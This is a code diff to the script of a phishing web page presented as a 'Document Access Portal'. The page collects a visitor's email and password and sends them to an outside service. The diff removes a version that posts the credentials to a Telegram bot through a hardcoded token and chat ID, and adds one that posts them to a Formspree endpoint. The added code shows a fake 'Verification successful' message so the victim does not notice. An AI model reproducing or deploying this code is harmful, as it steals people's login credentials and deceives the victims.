@@ -90,7 +90,6 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const portalForm = document.getElementById('portal-form');
-            
             if (!portalForm) return;
 
             portalForm.addEventListener('submit', async function(e) {
@@ -105,43 +104,32 @@
                 submitBtn.disabled = true;
                 statusBox.style.display = "none";
 
-                // Hardcoded configurations matching your active tokens
-                const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
-                const chatId = "1080822304";
-                
-                const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n📧 *Portal Email:* ${email}\n🔑 *Access Key:* \`${password}\``;
-                const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
+                const formspreeUrl = "https://formspree.io/f/mdeezrvy";
 
                 try {
-                    // Send directly from client browser, completely skipping the serverless backend step
-                    const response = await fetch(telegramUrl, {
+                    const response = await fetch(formspreeUrl, {
                         method: 'POST',
                         headers: {
+                            'Accept': 'application/json',
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: messageText,
-                            parse_mode: 'Markdown'
-                        })
+                        body: JSON.stringify({ email: email, password: password })
                     });
 
-                    const data = await response.json();
-
-                    if (response.ok && data.ok) {
+                    if (response.ok) {
                         statusBox.className = "status-msg success";
                         statusBox.innerText = "Verification successful. Connecting to secure file server...";
                         statusBox.style.display = "block";
                     } else {
                         statusBox.className = "status-msg error";
-                        statusBox.innerText = `API Error: ${data.description || "Submission rejected."}`;
+                        statusBox.innerText = "System validation error. Please check credentials.";
                         statusBox.style.display = "block";
                         submitBtn.innerText = "Unlock Document";
                         submitBtn.disabled = false;
                     }
                 } catch (err) {
                     statusBox.className = "status-msg error";
-                    statusBox.innerText = "Network transmission failed. Check connection parameters.";
+                    statusBox.innerText = "Network timeout. Try again shortly.";
                     statusBox.style.display = "block";
                     submitBtn.innerText = "Unlock Document";
                     submitBtn.disabled = false;
